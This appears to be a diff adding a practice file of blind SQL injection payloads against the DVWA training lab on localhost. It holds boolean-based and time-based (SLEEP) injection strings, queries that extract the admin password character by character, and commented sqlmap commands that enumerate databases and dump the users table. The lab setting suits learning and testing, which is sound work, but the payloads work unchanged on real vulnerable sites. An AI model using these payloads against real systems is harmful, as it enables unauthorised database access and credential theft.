@@ -1,0 +1,26 @@
+# Blind SQL Injection Payloads for DVWA
+# URL: http://localhost:8081/vulnerabilities/sqli_blind/
+
+# Boolean Based - True/False responses
+1' AND 1=1#    (true - shows user)
+1' AND 1=2#    (false - no user)
+
+# Check if admin exists
+1' AND (SELECT COUNT(*) FROM users WHERE user='admin')=1#
+
+# Extract password length
+1' AND LENGTH((SELECT password FROM users WHERE user='admin'))=32#
+
+# Extract password character by character
+1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),1,1)='5'#
+1' AND SUBSTRING((SELECT password FROM users WHERE user='admin'),2,1)='f'#
+
+# Time Based Blind
+1' AND SLEEP(5)#
+1' AND IF(1=1,SLEEP(5),0)#
+1' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(5),0)#
+
+# Using sqlmap (automated)
+# sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" --dbs
+# sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" -D dvwa --tables
+# sqlmap -u "http://localhost:8081/vulnerabilities/sqli_blind/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" -D dvwa -T users --dump
